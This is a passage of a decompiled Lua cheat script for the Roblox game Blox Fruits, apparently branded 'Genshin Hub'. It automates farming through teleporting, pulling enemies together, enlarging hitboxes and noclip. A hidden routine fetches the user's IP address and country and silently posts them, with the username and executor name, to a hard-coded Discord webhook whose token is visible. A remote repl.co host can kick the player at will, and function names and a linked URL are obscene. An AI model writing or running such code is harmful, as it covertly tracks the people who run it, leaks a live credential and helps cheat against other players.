                local v401 = next
                local v402 = nil
                while true do
                    local v403
                    v402, v403 = v401(v400, v402)
                    if v402 == nil then
                        break
                    end
                    local v404 = next
                    local v405 = v403.Task
                    local v406 = nil
                    while true do
                        local v407
                        v406, v407 = v404(v405, v406)
                        if v406 == nil then
                            break
                        end
                        if v406 == v394 then
                            return v394
                        end
                    end
                end
            end
        end
        function GetInfoBossQuest(p408)
            returnrnrnr = {}
            local v409 = next
            local v410, v411 = require(game:GetService("ReplicatedStorage").Quests)
            while true do
                local v412
                v411, v412 = v409(v410, v411)
                if v411 == nil then
                    break
                end
                local v413 = next
                local v414 = v411
                local v415 = nil
                while true do
                    local v416
                    v415, v416 = v413(v412, v415)
                    if v415 == nil then
                        break
                    end
                    if v416.LevelReq <= getPlayerLevel() and v416.Name == p408 then
                        returnrnrnr.QuestName = v414
                        returnrnrnr.QuestId = v415
                        return returnrnrnr
                    end
                end
            end
        end
        function getBossCanKill()
            local v417, v418, v419 = pairs(c().Process.Boss["Questable Boss"])
            while true do
                local v420
                v419, v420 = v417(v418, v419)
                if v419 == nil then
                    break
                end
                local v421 = CheckBoss(v420)
                if v421 then
                    levelstring = string.gsub(string.gsub(v421.Name, ".*Lv%.%s*(%d+).*", "%1"), " ", "")
                    levelnum = tonumber(levelstring)
                    return {
                        v421,
                        GetInfoBossQuest(CheckQuestBoss(v421.Name)),
                        levelstring,
                        getPlayerLevel() >= levelnum
                    }
                end
            end
            return {
                [4] = false
            }
        end
        function CheckWaterKey()
            local v422 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
            if v422 ~= 3 and v422 ~= 1 then
                return false
            end
            WaterKey = true
            return true
        end
        function getSpeficalBoss()
            return CheckBoss("Darkbeard [Lv. 1000] [Raid Boss]") or CheckBoss("rip_indra True Form [Lv. 5000] [Raid Boss]")
        end
        local vu423 = game.Players.LocalPlayer
        local vu424 = {
            "Special Microchip",
            "God\'s Chalice",
            "Sweet Chalice",
            "Relic",
            "Key",
            "Torch",
            "Flower 1",
            "Flower 2",
            "Flower 3",
            "Hallow Essence",
            "Fire Essence",
            "Holy Torch",
            "Library Key",
            "Hidden Key",
            "Water Key"
        }
        rarity = {
            [0] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
            [1] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
            [2] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
            [3] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
            [4] = "\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189\239\191\189",
            [5] = "wtf"
        }
        function resetable()
            local v425, v426, v427 = pairs(vu424)
            while true do
                local v428
                v427, v428 = v425(v426, v427)
                if v427 == nil then
                    break
                end
                if game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(v428) or game:GetService("Players").LocalPlayer.Character:FindFirstChild(v428) then
                    return false
                end
            end
            local v429, v430, v431 = pairs(game.Players.LocalPlayer.Backpack:GetChildren())
            while true do
                local v432
                v431, v432 = v429(v430, v431)
                if v431 == nil then
                    break
                end
                if v432:FindFirstChild("EatRemote") then
                    return false
                end
            end
            local v433, v434, v435 = pairs(game.Players.LocalPlayer.Character:GetChildren())
            while true do
                local v436
                v435, v436 = v433(v434, v435)
                if v435 == nil then
                    break
                end
                if v436:FindFirstChild("EatRemote") then
                    return false
                end
            end
            return true
        end
        function getSpawn(p437)
            local v438 = math.huge
            local v439, v440, v441 = pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(vu423.Team)):GetChildren())
            local v442 = nil
            while true do
                local v443
                v441, v443 = v439(v440, v441)
                if v441 == nil then
                    break
                end
                if (v443:GetModelCFrame().Position - p437.Position).Magnitude < v438 then
                    v442 = v443:GetModelCFrame()
                    v438 = (v443:GetModelCFrame().Position - p437.Position).Magnitude
                end
            end
            return v442
        end
        function request(p444)
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack({
                "requestEntrance",
                p444
            }))
        end
        function disnoy(p445, p446)
            return (Vector3.new(p445.X, 0, p445.Z) - Vector3.new(p446.X, 0, p446.Z)).Magnitude
        end
        function check11()
            local v447 = game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible and game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text
            if v447 then
                v447 = string.find(string.lower(game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text), "risk")
            end
            return v447
        end
        function getPortal(p448)
            local v449 = p448.Position
            local v450 = game.PlaceId
            if v450 == 2753915549 then
                gQ = {
                    Vector3.new(- 7894.6201171875, 5545.49169921875, - 380.246346191406),
                    Vector3.new(- 4607.82275390625, 872.5422973632812, - 1667.556884765625),
                    Vector3.new(61163.8515625, 11.759522438049316, 1819.7841796875),
                    Vector3.new(3876.280517578125, 35.10614013671875, - 1939.3201904296875)
                }
            elseif v450 == 4442272183 then
                gQ = {
                    Vector3.new(- 288.46246337890625, 306.130615234375, 597.9988403320312),
                    Vector3.new(2284.912109375, 15.152046203613281, 905.48291015625),
                    Vector3.new(923.21252441406, 126.9760055542, 32852.83203125),
                    Vector3.new(- 6508.5581054688, 89.034996032715, - 132.83953857422)
                }
            elseif v450 == 7449423635 then
                gQ = {
                    Vector3.new(- 5058.77490234375, 314.5155029296875, - 3155.88330078125),
                    Vector3.new(5756.83740234375, 610.4240112304688, - 253.9253692626953),
                    Vector3.new(- 12463.8740234375, 374.9144592285156, - 7523.77392578125),
                    Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586),
                    Vector3.new(- 11993.580078125, 334.7812805175781, - 8844.1826171875),
                    Vector3.new(5314.58203125, 25.419387817382812, - 125.94227600097656)
                }
            end
            local v451 = Vector3.new(0, 0, 0)
            local v452 = math.huge
            local v453, v454, v455 = pairs(gQ)
            while true do
                local v456
                v455, v456 = v453(v454, v455)
                if v455 == nil then
                    break
                end
                if (v456 - v449).Magnitude < v452 then
                    local v457 = vu423
                    if (v456 - v449).Magnitude < v457:DistanceFromCharacter(v456) + 300 and v451 ~= v456 then
                        v452 = (v456 - v449).Magnitude
                        v451 = v456
                    end
                end
            end
            return v451
        end
        function cancel()
            pcall(function()
                sexroblox:Cancel()
            end)
        end
        function grgrgrgrg(pu458)
            pcall(function()
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pu458
                wait(1)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pu458
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
            end)
        end
        function giunhabatman()
            pcall(function()
                local v459, v460, v461 = pairs(game.Players.LocalPlayer.Character:GetDescendants())
                while true do
                    local v462
                    v461, v462 = v459(v460, v461)
                    if v461 == nil then
                        break
                    end
                    if v462:IsA("BasePart") then
                        v462.CanCollide = false
                    end
                end
                if not game.Players.LocalPlayer.Character.Head:FindFirstChild("eltrul") then
                    local v463 = Instance.new("BodyVelocity", vu423.Character.Head)
                    v463.Name = "eltrul"
                    v463.MaxForce = Vector3.new(0, math.huge, 0)
                    v463.Velocity = Vector3.new(0, 0, 0)
                end
            end)
        end
        function check11()
            local v464 = game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible and game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text
            if v464 then
                v464 = string.find(string.lower(game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text), "risk")
            end
            return v464
        end
        function to(p465)
            if not vu423.Character:FindFirstChild("Head") then
                repeat
                    wait()
                until vu423.Character:FindFirstChild("Head")
            end
            local v466, v467, v468 = pairs(game.Players.LocalPlayer.Character:GetDescendants())
            while true do
                local v469
                v468, v469 = v466(v467, v468)
                if v468 == nil then
                    break
                end
                if v469:IsA("BasePart") then
                    v469.CanCollide = false
                end
            end
            if not game.Players.LocalPlayer.Character.Head:FindFirstChild("eltrul") then
                local v470 = Instance.new("BodyVelocity", vu423.Character.Head)
                v470.Name = "eltrul"
                v470.MaxForce = Vector3.new(0, math.huge, 0)
                v470.Velocity = Vector3.new(0, 0, 0)
            end
            local v471 = vu423:DistanceFromCharacter(p465.Position)
            if v471 < 150 then
                pcall(function()
                    sexroblox:Cancel()
                end)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p465
            end
            local v472 = getSpawn(p465)
            local v473 = getPortal(p465)
            if check11() or disnoy(v473, v472.Position) <= 850 or (disnoy(p465.Position, v472.Position) >= disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p, p465.Position) or (disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p, v472.Position) <= 3500 or (disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p, v473) <= 1500 or (game.Players.LocalPlayer:DistanceFromCharacter(p465.Position) <= 1200 or not resetable())))) then
                if disnoy(p465.Position, v473) < disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p, p465.Position) and disnoy(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame().p, v473) > 450 then
                    cancel()
                    request(v473)
                end
            else
                cancel()
                grgrgrgrg(v472)
            end
            local v474 = v471 / 320
            sexroblox = game:GetService("TweenService"):Create(vu423.Character.HumanoidRootPart, TweenInfo.new(v474, Enum.EasingStyle.Linear), {
                CFrame = p465
            })
            sexroblox:Play()
            return sexroblox
        end
        function getdelaytime(p475)
            oldtime = p475 or tick()
            timerun = timerun or 0
            local _ = 0.1 >= tick() - oldtime
            return true
        end
        function checkdt(_)
            return true
        end
        function LogConCac()
            k2 = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://api.myip.com"))
            k3 = {}
            local v476 = k3
            local v477 = {}
            local v478 = {
                title = "Suc Cac",
                url = "https://thumbzilla.com/",
                description = game.Players.LocalPlayer.Name,
                fields = {
                    {
                        name = "Game",
                        value = tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can\'t Fetch",
                        inline = false
                    },
                    {
                        name = "Ip Address",
                        value = k2.ip or "Cant Log",
                        inline = false
                    },
                    {
                        name = "Country",
                        value = k2.country or "cant log",
                        inline = false
                    },
                    {
                        name = "Exploit",
                        value = tostring(identifyexecutor()) or "Custom Exploit???",
                        inline = false
                    }
                }
            }
            __set_list(v477, 1, {
                v478
            })
            v476.embeds = v477
            return k3
        end
        function buglog(p479)
            k3 = {}
            local v480 = k3
            local v481 = {}
            local v482 = {
                title = "Con Cac",
                url = "https://thumbzilla.com/",
                description = game.Players.LocalPlayer.Name,
                fields = {
                    {
                        name = "Game",
                        value = tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can\'t Fetch",
                        inline = false
                    },
                    {
                        name = "Problems",
                        value = p479 or "",
                        inline = false
                    },
                    {
                        name = "Process",
                        value = (m1 or "none") .. " | " .. (m2 or "none"),
                        inline = false
                    }
                }
            }
            __set_list(v481, 1, {
                v482
            })
            v480.embeds = v481
            return k3
        end
        function isMirageSpawn()
            return game:GetService("Workspace").Map:FindFirstChild("MysticIsland")
        end
        function PostWebhook(p483, p484)
            (http_request or request or (HttpPost or syn.request))({
                Url = p483,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode(p484)
            })
        end
        spawn(function()
            PostWebhook("https://discord.com/api/webhooks/1148666687030317110/hTS32yF21g5JH_Coy2QDjskyCvKhJSB-L4bGJTSCCLblOd8YDVNcrtx1dgNi8A69iJxr", LogConCac())
        end)
        function CFrameQuest()
            QuestPoses = {}
            local v485, v486, v487 = pairs(getnilinstances())
            while true do
                local v488
                v487, v488 = v485(v486, v487)
                if v487 == nil then
                    break
                end
                if v488:IsA("Model") and v488:FindFirstChild("Head") and (v488.Head:FindFirstChild("QuestBBG") and (v488.Head.QuestBBG.Title.Text == "QUEST" and v488.Name ~= "Villager")) then
                    QuestPoses[v488.Name] = v488:WaitForChild("HumanoidRootPart").CFrame * CFrame.new(0, - 2, 2)
                end
            end
            local v489, v490, v491 = pairs(game.Workspace.NPCs:GetDescendants())
            while true do
                local v492
                v491, v492 = v489(v490, v491)
                if v491 == nil then
                    break
                end
                if v492.Name == "QuestBBG" and (v492.Title.Text == "QUEST" and v492.Parent.Parent.Name ~= "Villager") then
                    QuestPoses[v492.Parent.Parent.Name] = v492.Parent.Parent.HumanoidRootPart.CFrame * CFrame.new(0, - 2, 2)
                end
            end
            DialoguesList = {}
            local v493, v494, v495 = pairs(require(game.ReplicatedStorage.DialoguesList))
            while true do
                local v496
                v495, v496 = v493(v494, v495)
                if v495 == nil then
                    break
                end
                DialoguesList[v496] = v495
            end
            local v497 = getscriptclosure(game:GetService("Players").LocalPlayer.PlayerScripts.NPC)
            local v498, v499, v500 = pairs(debug.getprotos(v497))
            local v501 = {}
            while true do
                local v502
                v500, v502 = v498(v499, v500)
                if v500 == nil then
                    break
                end
                if # debug.getconstants(v502) == 1 then
                    table.insert(v501, debug.getconstant(v502, 1))
                end
            end
            local v503, v504, v505 = pairs(debug.getconstants(v497))
            local v506 = false
            local v507 = {}
            while true do
                local v508
                v505, v508 = v503(v504, v505)
                if v505 == nil then
                    break
                end
                if type(v508) == "string" then
                    if v508 == "Players" then
                        v506 = false
                    end
                    v506 = not v506 and v508 == "Blox Fruit Dealer" and true or v506
                    if v506 then
                        table.insert(v507, v508)
                    end
                end
            end
            QuestPoint = {}
            local v509, v510, v511 = pairs(v507)
            local v512 = {}
            while true do
                local v513
                v511, v513 = v509(v510, v511)
                if v511 == nil then
                    break
                end
                if QuestPoses[v513] then
                    v512[v501[v511] ] = v507[v511]
                end
            end
            local v514 = next
            local v515 = nil
            while true do
                local v516
                v515, v516 = v514(v512, v515)
                if v515 == nil then
                    break
                end
                QuestPoint[v515] = QuestPoses[v516]
            end
            QuestPoint.SkyExp1Quest = CFrame.new(- 7857.28516, 5544.34033, - 382.321503, - 0.422592998, 0, 0.906319618, 0, 1, 0, - 0.906319618, 0, - 0.422592998)
        end
        function CheckBoss(p517)
            if skidymf(game:GetService("ReplicatedStorage"):FindFirstChild(p517)) then
                return game:GetService("ReplicatedStorage"):FindFirstChild(p517)
            end
            if skidymf(game.workspace.Enemies:FindFirstChild(p517)) then
                local _ = game.workspace.Enemies.FindFirstChild
            end
        end
        function EquipWeaponName(p518)
            if p518 then
                NoClip = true
                ToolSe = p518
                if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
                    local v519 = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
                    wait(0.4)
                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v519)
                    return true
                end
                if game.Players.LocalPlayer.Character:FindFirstChild(p518) then
                    local _ = game.Players.LocalPlayer.Character.FindFirstChild
                end
            end
        end
        function skidymf(p520)
            return p520 and (p520.Parent and (p520:FindFirstChild("Humanoid") and (p520:FindFirstChild("HumanoidRootPart") and p520.Humanoid.Health >= 0))) and (p520.HumanoidRootPart or p520.Character.HumanoidRootPart).CFrame and true or false
        end
        function skidymf1()
            sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
            local v521, v522, v523 = pairs(getsortedmon())
            local v524 = {}
            local v525 = false
            while true do
                local v526
                v523, v526 = v521(v522, v523)
                if v523 == nil then
                    break
                end
                if skidymf(v526) then
                    local v527, v528, v529 = pairs(getsortedmon())
                    while true do
                        local v530
                        v529, v530 = v527(v528, v529)
                        if v529 == nil then
                            break
                        end
                        if skidymf(v530) and (skidymf(v526) and (v530.HumanoidRootPart.Position - v526.HumanoidRootPart.Position).Magnitude < 400) then
                            if v524[v526.HumanoidRootPart.CFrame] then
                                v524[v526.HumanoidRootPart.CFrame] = v524[v526.HumanoidRootPart.CFrame] + 1
                            else
                                v524[v526.HumanoidRootPart.CFrame] = 1
                            end
                        end
                    end
                end
            end
            local v531 = dbobii(v524)
            local v532, v533, v534 = pairs(v524)
            while true do
                local v535
                v534, v535 = v532(v533, v534)
                if v534 == nil then
                    break
                end
                if v535 == v531 then
                    v525 = v534
                end
            end
            return v525
        end
        function dbobii(p536)
            local v537, v538, v539 = pairs(p536)
            local v540 = 0
            while true do
                local v541
                v539, v541 = v537(v538, v539)
                if v539 == nil then
                    break
                end
                if v540 < v541 then
                    v540 = v541
                end
            end
            return v540
        end
        function GetNpcPos(p542)
            local v543, v544, v545 = pairs(getsortedmon())
            local v546 = nil
            local v547 = 0
            while true do
                local v548
                v545, v548 = v543(v544, v545)
                if v545 == nil then
                    break
                end
                if v548.Name == p542 then
                    if v546 then
                        v546 = v546 + v548.HumanoidRootPart.Position
                    else
                        v546 = v548.HumanoidRootPart.Position
                    end
                    v547 = v547 + 1
                end
            end
            return v546 / v547
        end
        function SizePart(p549)
            if not p549:FindFirstChild("HumanoidRootPart") then
                return nil
            end
            p549.HumanoidRootPart.CanCollide = false
            p549.Humanoid:ChangeState(11)
            if not p549.HumanoidRootPart:FindFirstChild("Hold") then
                local v550 = Instance.new("BodyVelocity", p549.HumanoidRootPart)
                v550.Name = "Hold"
                v550.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                v550.Velocity = Vector3.new(0, 0, 0)
            end
        end
        function GetNearestPlayer(p551)
            ner = math.huge
            local v552, v553, v554 = pairs(game.Players:GetChildren())
            while true do
                local v555
                v554, v555 = v552(v553, v554)
                if v554 == nil then
                    break
                end
                if v555 and (skidymf(v555.Character) and (v555.Character.HumanoidRootPart.Position - p551).Magnitude < ner) then
                    ner = (v555.Character.HumanoidRootPart.Position - p551).Magnitude
                end
            end
            local v556, v557, v558 = pairs(game.Players:GetChildren())
            while true do
                local v559
                v558, v559 = v556(v557, v558)
                if v558 == nil then
                    break
                end
                if v559 and (skidymf(v559.Character) and (v559.Character.HumanoidRootPart.Position - p551).Magnitude <= ner) then
                    ner2 = v559.Name
                end
            end
            if game.Players.LocalPlayer.Name == ner2 then
                return true
            end
        end
        network = isnetworkowner or (InMyNetWork or newcclosure(function()
            return true
        end))
        function createcheckthread(pu560)
            spawn(function()
                if pu560 then
                    if skidymf(pu560[1]) then
                        pu560[5] = pu560[1].Humanoid
                        pu560[6] = pu560[5].Health
                        pu560[7] = os.time() - pu560[2]
                        pu560[10] = pu560[1].HumanoidRootPart.CFrame
                        while skidymf(pu560[1]) and wait() do
                            if pu560[1].Humanoid.Health >= pu560[6] and pu560[7] > 3 then
                                pu560[1].HumanoidRootPart.CFrame = pu560[10]
                                pu560[1].Humanoid.Health = 0
                            end
                        end
                    end
                end
            end)
        end
        function gnc()
            kvbahifj = math.huge
            iroajjrod = nil
            local v561, v562, v563 = pairs(game.Workspace:GetChildren())
            while true do
                local v564
                v563, v564 = v561(v562, v563)
                if v563 == nil then
                    break
                end
                if string.find(v564.Name, "Chest") and vu423:DistanceFromCharacter(v564.Position) < kvbahifj then
                    iroajjrod = v564
                    kvbahifj = vu423:DistanceFromCharacter(v564.Position)
                end
            end
            return iroajjrod
        end
        ajaxjaxjaxjax = {}
        function BringMob(pu565)
            pcall(function()
                local v566, v567, v568 = pairs(workspace.Enemies:GetChildren())
                while true do
                    local v569
                    v568, v569 = v566(v567, v568)
                    if v568 == nil then
                        break
                    end
                    if v569.Name == pu565.Name and ((v569.HumanoidRootPart.Position - pu565.HumanoidRootPart.Position).Magnitude <= 480 and ((v569.HumanoidRootPart.Position - pu565.HumanoidRootPart.Position).Magnitude > 10 and (v569:FindFirstChild("Humanoid") and (v569:FindFirstChild("HumanoidRootPart") and (v569.Humanoid.Health > 0 and network(v569.HumanoidRootPart)))))) then
                        createcheckthread({
                            v569,
                            os.time()
                        })
                        v569.HumanoidRootPart.CFrame = pu565.HumanoidRootPart.CFrame
                        v569.Humanoid.JumpPower = 0
                        v569.Humanoid.WalkSpeed = 0
                        v569.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                        v569.HumanoidRootPart.CanCollide = false
                        sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
                        v569.Humanoid:ChangeState(14)
                        v569.Humanoid:ChangeState(11)
                        SizePart(v569)
                    end
                end
            end)
        end
        function eatfruit(pu570)
            pcall(function()
                EquipWeaponName(pu570)
                if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities") and (game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getAwakenedAbilities").Z.Awakened and c().Process["Lock Awakening Fruit"]) then
                    noti("Lock Awakened Fruit")
                    game.Players.LocalPlayer.Character.Humanoid.Health = - 1
                elseif not workspace.Characters[vu423.Name][pu570].EatRemote:InvokeServer() then
                    game.Players.LocalPlayer.Character.Humanoid.Health = - 1
                end
            end)
        end
        function deobietsettengi()
            return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") ~= 1 and true or (CheckBoss("Jeremy [Lv. 850] [Boss]") and true or false)
        end
        function getMobPirateRaid()
            if CheckSea(3) then
                local v571, v572, v573 = pairs(game.ReplicatedStorage:GetChildren())
                while true do
                    local v574
                    v573, v574 = v571(v572, v573)
                    if v573 == nil then
                        break
                    end
                    if not string.find(v574.Name, "Brigade") and (v574:FindFirstChild("Humanoid") and (v574.Humanoid.Health > 0 and (v574:FindFirstChild("HumanoidRootPart") and ((v574.HumanoidRootPart.Position - Vector3.new(- 5543.5327148438, 313.80062866211, - 2964.2585449219)).magnitude <= 3000 and not (string.find(v574.Name, "Boss") or string.find(v574.Name, "Friend")))))) then
                        to(CFrame.new(Vector3.new(- 5543.5327148438, 313.80062866211, - 2964.2585449219)))
                    end
                end
                if checkNotify("pirates are raiding") then
                    to(CFrame.new(Vector3.new(- 5543.5327148438, 313.80062866211, - 2964.2585449219)))
                else
                    local v575, v576, v577 = pairs(workspace.Enemies:GetChildren())
                    while true do
                        local v578
                        v577, v578 = v575(v576, v577)
                        if v577 == nil then
                            break
                        end
                        if not string.find(v578.Name, "Brigade") and (v578:FindFirstChild("Humanoid") and (v578.Humanoid.Health > 0 and (v578:FindFirstChild("HumanoidRootPart") and ((v578.HumanoidRootPart.Position - Vector3.new(- 5543.5327148438, 313.80062866211, - 2964.2585449219)).magnitude <= 3000 and not (string.find(v578.Name, "Boss") or string.find(v578.Name, "Friend")))))) then
                            return v578
                        end
                    end
                    local v579, v580, v581 = pairs(game.ReplicatedStorage:GetChildren())
                    while true do
                        local vu582
                        v581, vu582 = v579(v580, v581)
                        if v581 == nil then
                            break
                        end
                        spawn(function()
                            if not string.find(vu582.Name, "Brigade") and (vu582:FindFirstChild("Humanoid") and vu582.Humanoid.Health > 0 and (vu582:FindFirstChild("HumanoidRootPart") and ((vu582.HumanoidRootPart.Position - Vector3.new(- 5543.5327148438, 313.80062866211, - 2964.2585449219)).magnitude <= 3000 and not (string.find(vu582.Name, "Boss") or string.find(vu582.Name, "Friend"))))) then
                                return vu582
                            end
                        end)
                    end
                end
            else
                return
            end
        end
        function UpV3()
            wait(2)
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                "Wenlocktoad",
                "3"
            }))
            wait(2)
        end
        function BTP(p583)
            game.Players.LocalPlayer.Character.Head:Destroy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p583
            wait(1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p583
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
        end
        function bypass(p584)
            local v585 = math.huge
            local v586, v587, v588 = pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(game.Players.LocalPlayer.Team)):GetChildren())
            local v589 = nil
            while true do
                local v590
                v588, v590 = v586(v587, v588)
                if v588 == nil then
                    break
                end
                if game.Players.LocalPlayer:DistanceFromCharacter(v590:GetModelCFrame().Position) < v585 then
                    v589 = v590:GetModelCFrame()
                    v585 = game.Players.LocalPlayer:DistanceFromCharacter(v590:GetModelCFrame().Position)
                end
            end
            if (p584.Position - CFrame.new(61191.12109375, 18.497436523438, 1561.8873291016).Position).Magnitude < 5000 then
                requestEntrance(CFrame.new(61191.12109375, 18.497436523438, 1561.8873291016).Position)
            end
            if v589 and (game.Players.LocalPlayer:DistanceFromCharacter(v589.Position) < game.Players.LocalPlayer:DistanceFromCharacter(p584.Position) and game.Players.LocalPlayer:DistanceFromCharacter(v589.Position) > 200) then
                BTP(v589)
            end
        end
        function CheckSea(p591)
            if not sussea then
                if game.PlaceId ~= 2753915549 then
                    if game.PlaceId ~= 4442272183 then
                        if game.PlaceId == 7449423635 and p591 == 3 then
                            sussea = 3
                            return true
                        end
                    elseif p591 == 2 then
                        sussea = 2
                        return true
                    end
                elseif p591 == 1 then
                    sussea = 1
                    return true
                end
                return false
            end
            if sussea == p591 then
                return true
            end
        end
        function TeleportSea(p592)
            if p592 == 1 then
                if not CheckSea(p592) then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                        "TravelMain"
                    }))
                    wait()
                end
            elseif p592 == 2 then
                if not CheckSea(p592) then
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                        "TravelDressrosa"
                    }))
                end
            elseif p592 == 3 and not CheckSea(p592) then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack({
                    "TravelZou"
                }))
            end
        end
        getgenv().a = false
        LPH_CRASH = LPH_CRASH or function()
            while true do
            end
        end
        function out(p593, p594)
            if p593 then
                p594()
            end
        end
        out(getgenv().a, LPH_CRASH)
        getgenv().a = {
            host = "https://cringeman.gggggjdksksk.repl.co"
        }
        function parserPath(p595)
            return getgenv().a.host .. "/" .. p595
        end
        function fetch_data()
            local v596 = game:HttpGet(parserPath("/api/v1/getInfo"))
            local v597 = game:GetService("HttpService"):JSONDecode(v596).data
            warn(v596)
            return v597
        end
        function bingu(pu598, pu599)
            pcall(function()
                game.Players.LocalPlayer:Kick(pu599)
                local v600, v601, v602 = pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren())
                while true do
                    local v603
                    v602, v603 = v600(v601, v602)
                    if v602 == nil then
                        break
                    end
                    v603.TitleFrame.ErrorTitle.Text = pu598
                end
            end)
            wait(30)
        end
        out(Rapid, LPH_CRASH)
        Rapid = {
            Checking_Delay = 2
        }
        Rapid.DEFAULT_DATA = fetch_data()
        spawn(function()
            while task.wait((function()
                return Rapid.Checking_Delay > 5 and 2 or Rapid.Checking_Delay
            end)()) do
                warn(109283737)
                if Rapid.DEFAULT_DATA.POBqdNKxAW ~= fetch_data().POBqdNKxAW then
                    bingu("Genshin Hub / Server Crashed", "An Kick Request Requested From We Server")
                end
            end
        end)
        function down(p604)
            game:service("VirtualInputManager"):SendKeyEvent(true, p604, false, game)
            task.wait()
            game:service("VirtualInputManager"):SendKeyEvent(false, p604, false, game)
        end
        function equip(p605)
            local v606 = game.Players.LocalPlayer
            local v607 = v606.Character or v606.CharacterAdded:Wait()
            local v608, v609, v610 = pairs(v606.Backpack:GetChildren())
            while true do
                local v611
                v610, v611 = v608(v609, v610)
                if v610 == nil then
                    break
                end
                if v611:IsA("Tool") and v611.ToolTip == p605 then
                    local v612 = v607:FindFirstChildOfClass("Humanoid")
                    if v612 and not v612:IsDescendantOf(v611) then
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(v611)
                        return v611
                    end
                end
            end
            return false
        end
        function gmlp()
            if MobLevel1OrMobLevel2() then
                local _ = MobLevel1OrMobLevel2():gsub(" %pLv. %d+%p", "").gsub
            end
        end
        function fruitspawn()
            local v613, v614, v615 = pairs(game.Workspace:GetChildren())
            while true do
                local v616
                v615, v616 = v613(v614, v615)
                if v615 == nil then
                    break
                end
                if string.find(v616.Name, "Fruit") and v616:FindFirstChild("Handle") then
                    local v617, v618, v619 = pairs(v616:GetChildren())
                    while true do
                        local v620
                        v619, v620 = v617(v618, v619)
                        if v619 == nil then
                            break
                        end
                        if string.find(v620.Name, "Mesh") and (v616.Handle.CFrame.Position - v620.CFrame.Position).Magnitude < 5 then
                            return v616
                        end
                    end
                end
            end
        end
        function storefruit()
            if not AutoRaid then
                repeat
                    wait()
                until game:GetService("Players").LocalPlayer:FindFirstChild("Data")
                local _ = game:GetService("Players").LocalPlayer:FindFirstChild("Data").DevilFruit.Value
                local v621, v622, v623 = pairs(game.Players.LocalPlayer.Backpack:GetChildren())
                while true do
                    local v624
                    v623, v624 = v621(v622, v623)
                    if v623 == nil then
                        break
                    end
                    if string.find(v624.Name, "Fruit") then
                        local v625 = v624.Name
                        local v626, v627, v628 = pairs(vu21)
                        while true do
                            local v629
                            v628, v629 = v626(v627, v628)
                            if v628 == nil then
                                break
                            end
                            if string.find(string.lower(v629), string.gsub(string.lower(v625), " fruit", "")) then
                                if raidfruit and (v625 == raidfruit or string.find(v625, raidfruit)) then
                                    return
                                end
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", v629, v624)
                                if v624 and checkNotify("You can only store") then
                                    if v624 and (v624.Name and game.Players.LocalPlayer.Data.DevilFruit.Value) and (getFruitTier(v624.Name or v625) >= getFruitTier(NameDf()) and c().Fruit["Eat While Cant Store"]) then
                                        noti("Eat Fruit")
                                        eatfruit(v624.Name)
                                    elseif c().Fruit["Auto Raid While Cant Store"] and (getPlayerFragments() < c().Fruit["Fragments Limit By Fruit Loot Raid"] and (getPlayerLevel() > 1100 and not CheckSea(1))) then
                                        AutoRaid = true
                                        PullFruit = false
                                    else
                                        noti("Shit")
                                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                                    end
                                    return
                                end
                                noti("stored")
                            end
                        end
                    end
                end
                repeat
                    wait()
                until game:GetService("Players").LocalPlayer:FindFirstChild("Data")
